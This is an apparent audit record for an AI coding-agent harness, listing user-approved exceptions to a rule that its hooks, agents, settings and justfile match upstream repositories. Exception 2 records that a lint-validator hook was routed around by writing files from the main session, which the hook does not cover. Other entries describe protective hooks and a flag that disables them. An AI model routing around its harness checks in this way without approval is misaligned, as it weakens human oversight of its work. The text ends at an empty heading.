# ArhuGula — Documented Exceptions to the Disler-Authoritative Rule

**Created:** 2026-04-13
**Branch:** `audit/identicality-2026-04-13`
**Precedence:** Disler wins unless an exception is listed here. Every exception must cite the SP audit round that approved it and a rationale.
**Classification note:** exceptions are still **DRIFT** per `feedback_disler_authoritative.md` — this file documents conscious, user-approved deviations, not a downgrade to MATCH.

---

## Structure

Each exception entry has:

- **Path(s)** — files or directories affected
- **SP audit round** — which audit round surfaced and approved the exception
- **Decision date** — absolute date of user approval
- **Rationale** — why the deviation is justified
- **Review cadence** — when to re-examine
- **Related findings** — scout/plan references
- **Follow-up actions** — what still needs to happen

---

## Exception 1 — Audit infrastructure tier (Tier 3)

**Decision:** Decision 2B, SP1 round 1

**Path(s)** (confirmed inventions that constitute the audit pipeline itself):
- `.claude/skills/prime/SKILL.md`
- `.claude/skills/scout/SKILL.md`
- `.claude/commands/architect.md`
- `.claude/commands/harness-review.md`
- `.claude/commands/migrate.md`
- `.claude/agents/architect.md`
- `.claude/agents/scout-agent.md`

**Removed from Exception 1 after attribution round 2** (2026-04-13):
- `.claude/agents/spec-checker.md` → routed to **Exception 5** (confirmed invention, NOT audit infrastructure)
- `.claude/agents/schema-reviewer.md` → routed to **Exception 5** (confirmed invention, NOT audit infrastructure)

**SP audit round:** SP1 round 1 (2026-04-13)
**Decision date:** 2026-04-13

**Rationale:**
These files are the audit pipeline itself — the `/scout`, `/architect`, `/build`, `/harness-review` commands and their supporting subagents/skills are what execute the identicality audit. Deleting them per the Disler-authoritative rule would break the audit mid-run (bootstrap paradox).

**Tier framing:** The user's authoritative hierarchy is Tier 1 (Disler full-clones, byte-level) → Tier 2 (IndyDevDan Comprehensive docs, intent-level) → ArhuGula (the target of the audit). This exception defines an implicit **Tier 3 — audit-orchestration infrastructure**, which lives above the Disler-replicated harness and is inherently ArhuGula-native because Disler does not ship a self-audit tool. The identicality goal applies to the harness being audited (Tiers 1+2), not to the tooling that audits it (Tier 3).

**Review cadence:** Quarterly, or whenever a Disler repo adds a self-audit pattern we could import.

**Related findings:**
- `audits/SP1-scout.md` — ESCALATE-T1 items E1, E2, E3
- `audits/SP1-plan.md` — D4 decision, E1–E3 escalation entries
- Attribution search round 1 (2026-04-13): 9 of 10 candidate files NO MATCH in 19 full-clones; builder.md + validator.md FOUND in hooks-mastery `agents/team/`
- Attribution search round 2 (2026-04-13): targeted search for `spec-checker.md` + `schema-reviewer.md` in `the-library` + `claude-code-is-programmable` — CONFIRMED NO MATCH across all 19 clones; both routed to Exception 5

**Follow-up actions:**
1. (Complete) Attribution round 2: CONFIRMED NO MATCH for spec-checker + schema-reviewer across all 19 full-clones
2. Tier-3 files stay permanently under this exception; expansion of Tier 3 requires explicit user approval + new exception entry
3. Quarterly review to check if Disler has added any self-audit patterns

---

## Exception 2 — Validator-forced drift on upstream Python files

**STATUS:** RESOLVED 2026-04-13 — closed by SP3 r1 Phase E.

**Decision:** Decision 1D, SP1 round 1; closed at SP3 r1 Phase E (commit `8545217`).

**Path(s):**
- `.claude/status_lines/status_line_v2.py` — RESOLVED. The `import os` line was restored to upstream byte-identical content via main-session Write tool (commit `8545217`). Residual whitespace drift (18 indented-blank lines + 1 EOF-newline) routed to **Exception 16** as the 10th reverted-leaf-hook entry.

**SP audit round:** SP1 round 1 (2026-04-13) → SP3 round 1 (2026-04-13, closed)
**Decision date:** 2026-04-13
**Resolution date:** 2026-04-13

**Rationale (preserved for history):**
ArhuGula's `ruff_validator.py` PostToolUse hook blocks file writes that fail ruff lint checks. When upstream Disler repos have lint issues (unused imports, line length, missing docstrings, etc.), the validator **forces** the committed version to deviate from upstream byte-identicality. This is a genuine methodology tension between the audit goal (byte-identical upstream) and the validation pipeline (upstream-clean code).

**SP3 r1 Phase A empirical finding:** the validator scope is *narrower* than originally believed. The hook is wired exclusively in `agents/team/builder.md` frontmatter and fires only during `@builder` subagent invocations. Main-session Write/Edit tool calls do NOT fire the validator. Verified empirically 2026-04-13 by writing a deliberate ruff-violating Python file from main session — no log entry produced, no block.

**Resolution mechanism:**
1. SP3 r1 Phase B reverted the four byte-different validators (`ruff_validator.py`, `ty_validator.py`, `validate_file_contains.py`, `validate_new_file.py`) to upstream byte-identical content (with one bounded Exception 17 carve-out for `ty_validator.py`'s sub-package skip block).
2. SP3 r1 Phase E re-restored `status_line_v2.py` byte-identical via main-session Write — no validator interference. The unused `import os` is back.
3. The original Exception 2 routing to "validators run in advisory mode during audit commits" is no longer needed: validators are correctly scoped to subagent runs only, which means audit-pipeline commits made through main session are not subject to the block.

**For future audit-pipeline work routed via `@builder`:** the validator will still block lint-failing upstream restores. The pattern then is to add per-line `# noqa: <code>` markers on the restored file. As of this closure, no such case is known; if one arises, document at that time as a new sub-exception.

**Related findings:**
- `audits/SP1-plan.md` — Appendix A "third-round discovery — ruff validator forces drift from upstream" (historical)
- Commit `9f74fc3` in `audit/identicality-2026-04-13` — original observation
- SP3 r1 Phase A V1 verification — `ruff_validator.log` last entry 2026-04-13 20:17:26 (subagent-route); main-session Write of `audits/sp3_a1_test.py` at 22:10 produced no log entry
- Commit `8545217` — Phase E closure restore

---

## Exception 3 — SP2-blocked SP1 reverts

**Decision:** Option 2 path, SP1 round 1; expanded at decision gate 2026-04-13 to include D1a, D3, and D4 Option C leaf-hook reverts.

**Affected commits — original AUTO-REVERT set (8 of 14 in SP1-plan.md):**
1. Commit 1 — `.claude/hooks/utils/tts/*.py` (4 files)
2. Commit 2 — `.claude/hooks/utils/llm/*.py` (4 files)
3. Commit 4 — `.claude/settings.json` statusLine block revert
4. Commit 5 — `.claude/statusline.sh` deletion
5. Commit 6 — `.claude/hooks/setup_init.py` + `setup_maintenance.py` restore
6. Commit 7 — `.claude/settings.json` Setup hook wiring revert
7. Commit 8 — `.claude/hooks/setup.py` deletion
8. Commit 14 — `.claude/hooks/session_start.py` `REQUIRED_HOOKS` purge

**Affected commits — added at decision gate 2026-04-13 (from D1a, D3, D4 Option C):**

9. **D1a — Restore `Bash(mv:*)` in `.claude/settings.json`.** Upstream hooks-mastery allow-list includes `Bash(mv:*)`; ArhuGula dropped it. No trade-off. Blocked by `.claude/settings.json` `readOnlyPaths` entry (same block as Commits 4 and 7).

10. **D3 — Revert `.claude/commands/maintenance.md` content to upstream.** ~~Blocked because `.claude/commands/` is expected to be in `readOnlyPaths`~~ **RESOLVED 2026-04-13** — landed at `c04bc09`. SP2 Phase A empirical verification (`audits/sp2_verify.py`) proved `.claude/commands/` is not in any restricted-path tier. The "expected block" was extrapolation from real blocks on `.claude/hooks/` + `.claude/settings.json`, never verified. See SP2-scout.md ESCALATE-SP2-3.

11. **D4 Option C — Leaf hook reverts (9 files).** Revert to upstream `claude-code-hooks-mastery/.claude/hooks/` form the 9 non-security hooks: `notification.py`, `pre_compact.py`, `stop.py`, `subagent_start.py`, `subagent_stop.py`, `post_tool_use.py`, `user_prompt_submit.py`, `post_tool_use_failure.py`, `session_end.py`. Blocked by `.claude/hooks/*.py` `readOnlyPaths` (fnmatch over-reach, same as Commits 1/2/6/8/14).

    **NOT reverted** (kept under Exception 8): `session_start.py`, `permission_request.py`, `pre_tool_use.py`, `_base.py`.

**SP audit round:** SP1 round 1 (2026-04-13)
**Decision date:** 2026-04-13

**Rationale:**
These 8 commits touch paths that are either intentionally protected by `readOnlyPaths` in `patterns.yaml` (existing hook files, `.claude/settings.json`) or unintentionally blocked by the fnmatch over-reach bug (the rule `.claude/hooks/*.py` matches subdirectories because Python's `fnmatch.fnmatch()` does not treat `/` as special). The audit cannot self-unlock per `feedback_damage_control_self_unlock.md`.

Cleaner path: let SP2 audit fix the underlying bug (`patterns.yaml` narrowing or hook code change), then re-run these 8 commits as an **SP1 resume pass**.

**Review cadence:** When SP2 audit closes.

**Related findings:**
- `audits/SP1-plan.md` — Appendix A (blocked commits table)
- `project_sp2_architectural_gaps.md` memory — already documents the fnmatch over-reach as a P0 SP2 follow-up
- Builder execution reports from 2026-04-13 SP1 run (Commit 1 block + Commit 4 block)

**Follow-up actions:**
1. SP2 scout: identifies the fnmatch bug + `.claude/settings.json` in `readOnlyPaths`
2. SP2 architect: proposes `patterns.yaml` narrowing or `write_damage_control.py` path-matching fix
3. SP2 build: executes the fix
4. SP2 verify: re-runs SP1 Commits 1, 2, 4, 5, 6, 7, 8, 14 against fixed rules
5. Mark SP1 as "SP1 round 1 complete" once those 8 commits land
6. Update this exception to "resolved"

---

## Exception 4 — `builder.md` + `validator.md` mis-location + content drift

**STATUS:** RESOLVED 2026-04-13 — landed at `36bac66` (builder.md) and `7fd0f3c` (validator.md). SP2 Phase A empirical verification (`audits/sp2_verify.py`) proved `.claude/agents/` is not in any restricted-path tier; `git mv` + Edit to `.claude/agents/team/` + byte-identical content revert all allowed through damage-control. Archive migration deferred to later cleanup pass.

**Decision:** Decision 3B, SP1 round 1

**Path(s):**
- `.claude/agents/builder.md` — upstream path is `claude-code-hooks-mastery/.claude/agents/team/builder.md`; ArhuGula has it at flat `agents/` level. Structural content delta: ArhuGula uses sonnet model with simplified hooks; upstream uses opus with complex ruff+type validation hooks.
- `.claude/agents/validator.md` — upstream path is `claude-code-hooks-mastery/.claude/agents/team/validator.md`; same flat-vs-subdirectory mismatch. Content delta: ArhuGula uses sonnet + plan mode + read-only focus; upstream uses opus + task-based workflow.

**SP audit round:** SP1 round 1 (2026-04-13)
**Decision date:** 2026-04-13

**Rationale:**
Both files are **FOUND** upstream (unlike Exception 1's inventions), but need two actions to reach MATCH:
1. `git mv` from `.claude/agents/` (flat) to `.claude/agents/team/` (upstream layout)
2. Content revert to upstream byte-identical

Both actions are likely blocked by the same SP2 fnmatch / `readOnlyPaths` issue affecting Exception 3 — specifically, `.claude/agents/` is expected to also be in `readOnlyPaths` based on the pattern of blocks observed with `.claude/hooks/` and `.claude/settings.json`. SP2 fixup batch should include verifying and unblocking `.claude/agents/` edits.

**Review cadence:** When SP2 audit closes (same as Exception 3).

**Related findings:**
- Attribution search round 1 (2026-04-13) — E1 results: FOUND in hooks-mastery `agents/team/`
- `audits/SP1-plan.md` — E1 escalation

**Follow-up actions:**
1. SP2 scout: verify `.claude/agents/` is in `readOnlyPaths` (expected yes)
2. SP2 fixup batch: `git mv` from flat `agents/` to `agents/team/` for both files
3. SP2 fixup batch: revert content of both files to upstream byte-identical
4. SP1 resume pass: verify move + content revert landed correctly
5. Update this exception to "resolved"

---

## Exception 5 — Confirmed invention deletions (deferred to SP2)

**STATUS:** RESOLVED 2026-04-13 — landed at `9ed2995`. Both `.claude/agents/spec-checker.md` and `.claude/agents/schema-reviewer.md` deleted via `git rm`. SP2 Phase A empirical verification (`audits/sp2_verify.py`) proved the operations were never blocked. Archive migration deferred to later cleanup pass.

**Decision:** Attribution round 2 classification, SP1 round 1

**Path(s):**
- `.claude/agents/spec-checker.md` — invention, classify DELETE per Disler-authoritative rule
- `.claude/agents/schema-reviewer.md` — invention, classify DELETE per Disler-authoritative rule

**SP audit round:** SP1 round 1 (2026-04-13)
**Decision date:** 2026-04-13

**Rationale:**
Attribution round 2 (2026-04-13) confirmed both files have zero upstream source across all 19 Disler full-clones. Primary search: neither exists in `the-library` or `claude-code-is-programmable`. Secondary re-verify: glob + grep across all full-clones returned NO MATCH in every repo. These are genuine ArhuGula inventions, not mis-routed files.

Under the Disler-authoritative rule, confirmed inventions must be deleted. However, deletion requires removing files in `.claude/agents/`, which is expected to be in `readOnlyPaths` based on the pattern of blocks observed with `.claude/hooks/` and `.claude/settings.json` during SP1 round 1. Deletion is deferred to SP2 fixup batch.

**Distinction from Exception 1:** These two files are **NOT audit infrastructure** — they are unused/low-value inventions (spec compliance checker, data schema validator) that the audit pipeline itself doesn't depend on. They don't need the Tier-3 preservation carve-out. They're just drift that needs to be removed.

**Review cadence:** When SP2 audit closes.

**Related findings:**
- `audits/SP1-scout.md` — ESCALATE-T1 item E1 (subset)
- `audits/SP1-plan.md` — E1 routing recommendation
- Attribution round 1 report (2026-04-13): NO MATCH across all full-clones
- Attribution round 2 report (2026-04-13): CONFIRMED NO MATCH (primary + secondary re-verify)

**Follow-up actions:**
1. SP2 scout: verify `.claude/agents/` is in `readOnlyPaths` (expected yes)
2. SP2 fixup batch: `rm .claude/agents/spec-checker.md` + `rm .claude/agents/schema-reviewer.md`
3. SP2 verify: confirm both files are absent
4. Update this exception to "resolved"

---

## Exception 6 — Extended Bash permission allow-list in settings.json (D1b)

**Decision:** D1b, SP1 round 1 decision gate

**Path(s):**
- `.claude/settings.json` — `permissions.allow` list contains 9 entries beyond upstream `claude-code-hooks-mastery/.claude/settings.json`: `Bash(brew:*)`, `Bash(tmux:*)`, `Bash(just:*)`, `Bash(yq:*)`, `Bash(node:*)`, `Bash(xcode-select:*)`, `Bash(which:*)`, `Bash(test:*)`, `Bash(cat:*)`, and a top-level `Skill` permission.

**SP audit round:** SP1 round 1 (2026-04-13)
**Decision date:** 2026-04-13

**Rationale:**
The nine extra Bash allow entries cover tools used in nearly every ArhuGula workflow, most critically `just` (the Layer-4 invocation surface — every `just <recipe>` call would require a permission click without this allow). `brew`, `tmux`, `yq`, `node`, `xcode-select`, `which`, `test`, `cat` are invoked routinely by hooks, setup scripts, and justfile recipes. The `Skill` top-level allow enables `/skill` invocations without per-call prompts. Reverting the allow-list to upstream's minimal set would not change security posture (damage-control still gates every Bash call via `bash_damage_control.py`) but would impose severe runtime friction.

Upstream `Bash(mv:*)` is a separate item — it is *missing* from ArhuGula and must be restored. That action is tracked as D1a under Exception 3 (SP2-blocked resume pass) since the settings.json edit itself is blocked.

**Review cadence:** SP2 audit (when `.claude/settings.json` becomes editable again). If SP2 audit identifies any of these nine permissions as a security concern, revisit then.

**Related findings:**
- `audits/SP1-scout.md` — DRIFT[T1] scaffolding: "extended Bash permission allow-list"
- `audits/SP1-plan.md` — D1 decision gate item, architect recommendation to split into D1a (AUTO-REVERT) + D1b (DECISION)

**Follow-up actions:**
1. None required while this exception is active.
2. SP2 audit revisits the allow-list in its own scope; if any entry is flagged, return here.

---

## Exception 7 — SP2 damage-control hook wiring in settings.json (D2)

**Decision:** D2, SP1 round 1 decision gate

**Path(s):**
- `.claude/settings.json` — `hooks.PreToolUse` contains three SP2-specific matcher blocks wiring `bash_damage_control.py`, `edit_damage_control.py`, and `write_damage_control.py`. Upstream hooks-mastery has a single empty-matcher PreToolUse entry pointing at its own `pre_tool_use.py`.

**SP audit round:** SP1 round 1 (2026-04-13)
**Decision date:** 2026-04-13

**Rationale:**
Removing the SP2 damage-control hook wiring from settings.json unregisters the three damage-control hooks for the duration of the audit branch. This would disable `readOnlyPaths`, `zeroAccessPaths`, and `noDeletePaths` enforcement precisely while the audit is editing sensitive hook files — exactly the risk scenario `feedback_damage_control_self_unlock.md` warns against. The Disler-authoritative rule says "drift is drift regardless of rationale," but `project_sp2_architectural_gaps.md` notes that "the hooks are the security foundation everything else depends on." Keeping the wiring during the audit preserves security enforcement; the SP2 audit will re-examine the wiring in its own scope.

**Review cadence:** SP2 audit.

**Related findings:**
- `audits/SP1-scout.md` — DRIFT[T1] scaffolding: `.claude/settings.json` diverges from upstream
- `audits/SP1-plan.md` — D2 decision gate, architect recommendation: **keep as exception**
- `project_sp2_architectural_gaps.md` — hooks are the security foundation

**Follow-up actions:**
1. SP2 scout: include the settings.json PreToolUse wiring in its findings (whether the three-matcher form is correct, whether it should be consolidated to a single dispatcher, etc.)
2. SP2 decision: confirm or modify the wiring
3. Update this exception to "resolved" only if SP2 adopts a different wiring form

---

## Exception 8 — Security-critical hooks + `_base.py` kept in ArhuGula form (D4 Option C)

**Decision:** D4 Option C, SP1 round 1 decision gate. Absorbs D5 and D6 which were flagged as subsumed by / covered under D4.

**Path(s):**
- `.claude/hooks/_base.py` — ArhuGula-invented shared helper library (`Logger`, `emit_event`, `handle_health_check`, `read_stdin`, `run_hook`). Not present in either upstream repo.
- `.claude/hooks/session_start.py` — keeps `_base.py` import, `ARHUGULA_SESSION_ID` env var injection, `.env` whitelist with INJECT marker and secret denylist, structured JSONL event logging. Upstream form is minimal.
- `.claude/hooks/permission_request.py` — keeps `_base.py` import and the stricter `ALLOWED_TOOLS` / `ALLOWED_BASH_PREFIXES` allowlist. Upstream runs with `--log-only` flag and no allowlist (D5 kept-as-exception).
- `.claude/hooks/pre_tool_use.py` — keeps `_base.py` import and `patterns.yaml` loading for `zeroAccessPaths` and `mcp__*` namespace gates. Upstream only detects `rm -rf` (D6 kept-as-exception).

**SP audit round:** SP1 round 1 (2026-04-13)
**Decision date:** 2026-04-13

**Rationale:**
The D4 decision is the highest-blast-radius item in the SP1 plan. Full revert (Option A) would eliminate the entire observability layer (JSONL event logging, session correlation, `ARHUGULA_SESSION_ID`), the `.env` denylist protection in `session_start.py`, the `ALLOWED_TOOLS`/`ALLOWED_BASH_PREFIXES` stricter allowlist in `permission_request.py`, and the `patterns.yaml`-based zero-access and MCP-namespace gates in `pre_tool_use.py`. Upstream `pre_tool_use.py` only detects `rm -rf` — even weaker than ArhuGula's version with the known ripgrep-walk gap. Reverting any of the three security-critical hooks would be a genuine security regression below the current gapped state.

Option C (chosen) splits the revert: 9 non-security leaf hooks revert to upstream form (tracked under Exception 3 resume pass), while the 3 security-critical hooks + `_base.py` stay. The observability layer is preserved where it matters (security hooks + session boundaries) and removed where it's low-value (leaf event-emission hooks like notification, stop, pre_compact).

**`_base.py` preservation:** After the 9 leaf hooks revert, `_base.py` still has 3 consumers (session_start, permission_request, pre_tool_use), which is enough to justify keeping the shared helper. If future audits shrink the consumer list further, reconsider.

**Absorbs D5:** The `permission_request.py` `ALLOWED_TOOLS`/`ALLOWED_BASH_PREFIXES` allowlist is part of this exception. Architect recommendation on D5 was "defer to D4 decision"; Option C keeps permission_request in ArhuGula form, which keeps D5.

**Absorbs D6:** The `pre_tool_use.py` `patterns.yaml` loading is part of this exception. Architect recommendation on D6 was "keep as exception regardless of D4 decision"; Option C is consistent with that.

**Review cadence:** SP2 audit (which handles `patterns.yaml` fnmatch bug + `readOnlyPaths` scope); SP3 audit (which handles validator hooks and may revisit the observability layer decision); quarterly otherwise.

**Related findings:**
- `audits/SP1-scout.md` — DRIFT[T1] hook modifications (13 hooks); DRIFT[T1] invention (`_base.py`); Cross-tier reconciliation item 1
- `audits/SP1-plan.md` — D4 (highest-blast-radius, architect ESCALATE), D5 (subsumed), D6 (recommend keep)
- `project_sp2_architectural_gaps.md` — hooks are the security foundation
- `feedback_disler_authoritative.md` — drift is drift, but exceptions are documented drift with rationale

**Follow-up actions:**
1. SP1 resume pass: execute 9 leaf-hook reverts (tracked under Exception 3 item 11)
2. SP2 audit: may revisit `pre_tool_use.py` once the `patterns.yaml` fnmatch bug is fixed and the ripgrep-walk gap is addressed
3. SP3 audit: may revisit observability infrastructure as part of validator pipeline scope
4. If SP9 (orchestration / dashboard) needs a different event schema, update `_base.py` + consumers in that audit round
5. Quarterly review: check if any Disler repo has added a shared hook helper pattern we should align with

---

## Exception 9 — `.env.example` invention (E4)

**Decision:** E4, SP1 round 1 decision gate

**Path(s):**
- `.env.example` — ArhuGula root-level environment template. Neither `claude-code-hooks-mastery` nor `install-and-maintain` ships a `.env.example`.

**SP audit round:** SP1 round 1 (2026-04-13)
**Decision date:** 2026-04-13

**Rationale:**
E4 was escalated because scout could not byte-compare `.env.example` against upstream — the `pre_tool_use.py` hook blocks any Read against paths matching `.env` (the `.env.example` suffix also matches). At decision gate, a direct check of both upstream repos confirmed **neither ships `.env.example`**, so content comparison is moot: it is a pure invention regardless of what the file contains. The user-authorized one-shot Read could not be honored through the hook boundary, but the authorization is not needed once the upstream-absence check is done.

`.env.example` is load-bearing for ArhuGula runtime: `apps/observe`, `apps/listen`, `apps/direct`, `apps/drive`, and `apps/dropzone` all depend on environment variables (`LISTEN_PORT`, `OBSERVE_PORT`, `OBSERVE_RETENTION_DAYS`, `DATABASE_URL`, etc.) and `.env.example` is the documented template for bootstrapping a fresh clone. Deleting it would force every new ArhuGula user to reverse-engineer the required env vars from source code. Keep as exception.

**Review cadence:** SP2 audit (for the hook over-reach that blocked the scout Read) and SP8 audit (which owns the apps/ directory that consumes these env vars).

**Related findings:**
- `audits/SP1-scout.md` — ESCALATE-T1: `.env.example` byte comparison blocked
- `audits/SP1-plan.md` — E4 escalation, architect recommended Option 3 (user-authorized one-shot Read)
- `project_sp2_architectural_gaps.md` — `pre_tool_use.py` path-matching over-reach

**Follow-up actions:**
1. SP2 audit: narrow the `.env` path-match rule to not block `.env.example` Reads, or add an explicit exemption
2. SP8 audit: confirm the env-var list in `.env.example` matches what apps/ actually consume
3. If a future Disler repo adds a `.env.example`, upgrade this classification from invention to DRIFT[T1] and byte-compare

---

## Exception 10 — `fork-terminal` skill (E6) — T2-only, no T1 source

**Decision:** E6, SP1 round 1 decision gate

**Path(s):**
- (none) — this exception records a **missing** file that Comprehensive docs describe but no Disler full-clone implements.

**SP audit round:** SP1 round 1 (2026-04-13)
**Decision date:** 2026-04-13

**Rationale:**
`indydevdan_method_comprehensive_reference.md` §Part 5 Category 1 references a `fork-terminal` skill for spawning parallel agents. Scout searched all 19 Disler full-clones and found no `fork-terminal` implementation, SKILL.md, or command. Since there is no Tier 1 byte source, architect cannot revert-against anything — the T2-only gap can only be closed by either building from the description or deferring. Architect recommended defer (Option 2). Accepted.

If a future Disler repo ships `fork-terminal`, this exception upgrades to MISSING[T1] and the SP1 resume pass picks it up.

**Review cadence:** Whenever a Disler repo adds a skill we don't yet have, check if this is the one. Otherwise quarterly.

**Related findings:**
- `audits/SP1-scout.md` — Tier 2 MISSING[T2-only]: `fork-terminal` skill
- `audits/SP1-plan.md` — E6 escalation, architect recommendation: defer

**Follow-up actions:**
1. Quarterly Disler repo check: does any new full-clone ship `fork-terminal`?
2. If found: upgrade to MISSING[T1], generate SP1 resume-pass commit
3. If not: exception stays active indefinitely

---

## Exception 11 — `package.json` + `.tool-versions` (D7) — load-bearing inventions

**Decision:** D7, SP1 round 1 decision gate. Reversed from architect recommendation after content review revealed implicit SP11 coupling.

**Path(s):**
- `package.json` — ArhuGula root-level Node.js manifest. Declares `@anthropic-ai/claude-code ^2.1.104`, `yaml ^2.8.3`, `promptfoo 0.121.4`, and four npm scripts (`eval:builder`, `eval:validator`, `eval:scout`, `promptfoo:view`).
- `.tool-versions` — asdf/mise version pin file: `nodejs 22`, `python 3.12`.

**SP audit round:** SP1 round 1 (2026-04-13)
**Decision date:** 2026-04-13

**Rationale:**
Neither upstream repo ships `package.json` or `.tool-versions`, so these are pure inventions per the Disler-authoritative rule. Architect's original recommendation was to revert (delete) unless SP-owned code references them, pending a `grep -r "package.json\|.tool-versions"` check by the builder.

The literal grep ran at decision gate and returned only a conditional `Path(PROJECT_DIR, "package.json").exists()` check in `.claude/hooks/setup.py:50` (and `.pi/agents/pi-pi/` docs, which are SP12-scope). On that signal alone, D7 would be "revert — no blocking references."

However, a content review of `package.json` itself revealed that SP11 justfile recipes `eval-builder`, `eval-validator`, `eval-scout`, and `promptfoo-view` invoke `npm run eval:*` and `npx promptfoo view`, which implicitly consume `package.json` without naming it textually. The grep missed this entire dependency chain. Deleting `package.json` would break all four SP11 eval recipes and lose the Claude Code CLI version pin used by downstream tooling.

`.tool-versions` has no code references but pairs with `package.json` — the `nodejs 22` pin is consumed by the same npm toolchain that SP11 depends on. Keeping both together is more honest than splitting.

Both files are kept as ArhuGula inventions with explicit documented rationale: load-bearing for SP11 promptfoo evals + reproducible Node/Python pinning for a multi-SP harness.

**Review cadence:** SP11 audit (when validator/builder/scout eval recipes are audited, confirm package.json dependencies are still current); quarterly otherwise.

**Related findings:**
- `audits/SP1-scout.md` — DRIFT[T1] inventions list
- `audits/SP1-plan.md` — D7 decision gate, architect recommendation: revert if no references (reversed at gate)
- `justfile:158-178` — SP11 `eval-builder`, `eval-validator`, `eval-scout`, `promptfoo-view` recipes

**Follow-up actions:**
1. SP11 audit: verify the four eval recipes still work and the pinned promptfoo version is current
2. On any future Claude Code CLI major version bump, revisit the `^2.1.104` constraint
3. If asdf/mise becomes unsupported or a different version manager takes over, migrate the pins

---

## Exception 12 — `.claude/CLAUDE.md` comprehensive doc + nested path

**Decision:** SP1 round 1 follow-up mini-gate (2026-04-13)

**Path(s):**
- `.claude/CLAUDE.md` — 145-line ArhuGula project document. Upstream `claude-code-hooks-mastery/CLAUDE.md` is a root-level 0-byte stub; `install-and-maintain/` ships no CLAUDE.md at all.

**Two dimensions of drift documented here:**

1. **Content delta** — ArhuGula version contains the Source-of-Truth pointer, Source Precedence rules, 6 mandatory Implementation Rules, Directory Navigation table, Four-Layer Architecture table, Sub-Project Status table, Hook Security Model summary, and Skill routing directives. Upstream is 0 bytes.
2. **Path delta** — ArhuGula places it at `.claude/CLAUDE.md`; upstream places it at root `CLAUDE.md`. Both paths are valid Claude Code auto-loaded memory locations per Anthropic docs; functionally equivalent.

**SP audit round:** SP1 round 1 follow-up mini-gate
**Decision date:** 2026-04-13

**Rationale:**

**Content:** The CLAUDE.md content is load-bearing for the audit pipeline itself. Implementation Rule #1 ("Check the Source of Truth BEFORE building anything") is read from this file by every SP scout phase. Implementation Rule #3 ("No invented components") is what prevents scope drift across SP audits. The SP status table and Sub-Project Priority pointer drive `/prime` and every scout phase's "what's next" resolution. The skill-routing directives in the footer are how `/office-hours`, `/investigate`, `/ship`, `/review`, etc. get routed correctly during normal (non-audit) ArhuGula development. Reverting to a 0-byte stub would break audit continuity and all downstream skill routing in a single commit.

This is analogous to Exception 1 (Tier 3 audit infrastructure) — the content is ArhuGula-native because Disler does not ship an audit-capable harness or a multi-SP implementation-rules document. Upstream's 0-byte stub represents "we have no project instructions to tell the agent"; that stance is incompatible with running a 16-sub-project identicality audit.

**Path:** The `.claude/CLAUDE.md` placement works identically to root `CLAUDE.md` (both auto-load as project memory). Moving it to root would close the cosmetic path drift at the cost of touching every existing memory entry and commit that references the current path. No functional payoff. Status quo preserved.

**Review cadence:** Quarterly, or whenever a new Disler repo adds implementation-rules content at the CLAUDE.md layer (at which point this exception's content should be re-examined for drift against the new upstream standard).

**Related findings:**
- `audits/SP1-scout.md` — DRIFT[T1] scaffolding: "ArhuGula has 6.9k comprehensive project documentation... upstream is a 0-byte stub"
- `audits/SP1-plan.md` — flagged in Cross-reference table as "(deferred — see note)" / DECISION-REQUIRED, separate from D1–D7 gate

**Follow-up actions:**
1. Quarterly review: check if Disler has added CLAUDE.md content to any full-clone. If so, re-audit the content delta against the new reference.
2. If the Source of Truth document at `~/Projects/indydevdan-harness-research/docs/superpowers/specs/arhugula-source-of-truth.md` moves or gets superseded, update the pointer in `.claude/CLAUDE.md` and note the change here.
3. If ArhuGula ever needs a root `CLAUDE.md` (e.g., for a tool that only checks root), symlink rather than move — preserves the existing path while adding the new one.

---

## Exception 13 — `justfile` 307-line multi-SP form

**Decision:** SP1 round 1 follow-up mini-gate (2026-04-13)

**Path(s):**
- `justfile` (root) — 307-line ArhuGula form wiring SP1 Layer 1–4 + SP7 + SP8 + SP11 + SP12 + SP13 + SP14 recipes. Upstream `install-and-maintain/justfile` is 45 lines; upstream `claude-code-hooks-mastery/` ships no justfile.

**SP audit round:** SP1 round 1 follow-up mini-gate
**Decision date:** 2026-04-13

**Rationale:**

Upstream `install-and-maintain/justfile` is the only Tier 1 byte source and it is the minimal scaffolding for a demo repo — it contains `fe`, `be`, `reset` recipes pointing at `apps/frontend/`, `apps/backend/`, and `app_docs/`. ArhuGula does not ship any of those directories, so reverting the upstream `fe/be/reset` recipes back in would create dead recipes pointing at non-existent paths.

The upstream `cldi/cldm/cldii/cldit/cldmm` recipes use the `--model opus --dangerously-skip-permissions` prefix. ArhuGula's equivalents dropped the prefix because `--dangerously-skip-permissions` disables every hook wired in `settings.json`, which conflicts with Exception 7 (SP2 damage-control wiring kept). Reverting to the upstream prefix form would be a security regression — it would disable `bash_damage_control.py`, `edit_damage_control.py`, `write_damage_control.py`, `pre_tool_use.py`, and every other PreToolUse hook for every session launched via the justfile. This is not a neutral byte-match; it is a deliberate hardening decision.

The 260+ lines of ArhuGula-added recipes are the Layer-4 invocation surface for every sub-project built on this harness: `just prime`, `just scout`, `just architect`, `just build`, `just harness-review` (SP1); `just sfa-*` (SP7); `just listen`, `just send`, `just fanout`, `just session`, `just poll`, `just jobs`, `just db-prune`, `just dropzone` (SP8); `just eval-*`, `just promptfoo-view` (SP11); `just pi`, `just pi-team`, `just pi-chain`, `just pi-safe`, `just pi-drive`, ... (SP12); `just steer-*` (SP13); `just test-playwright-skill`, `just test-chrome-skill`, `just hop`, `just ui-review`, ... (SP14). Reverting these to the 45-line upstream form would silently break every SP7–SP14 command documented in the Source of Truth as BUILT.

**A partial revert was explicitly rejected** at the mini-gate: restoring `fe/be/reset` as dead stubs plus reverting `cldi/cldm/cldii/cldmm` to the opus-skip-permissions form would be worse than either full revert or full keep, because it would install broken recipe pointers AND reintroduce a security regression in one commit.

Keep as exception. The upstream justfile is scaffolding for a *different* demo repo; ArhuGula's justfile is the actual framework harness invocation surface for a 16-sub-project identicality audit target.

**Review cadence:** Each SP audit should re-check its own recipe block in the justfile against the SP's upstream source. If SP7's sfa-* recipes drift from `single-file-agents` upstream, that's tracked under SP7 audit, not here. This exception covers only the "keep the 307-line multi-SP form at all" decision.

**Related findings:**
- `audits/SP1-scout.md` — DRIFT[T1] scaffolding: "ArhuGula has 40+ recipes spanning SP1–SP14; upstream is a 1.0k minimal justfile"
- `audits/SP1-plan.md` — flagged in Cross-reference table as "(deferred — see note)" / DECISION-REQUIRED, separate from D1–D7 gate
- Exception 7 (SP2 damage-control wiring in settings.json) — the `--dangerously-skip-permissions` omission pairs with this exception's security rationale

**Follow-up actions:**
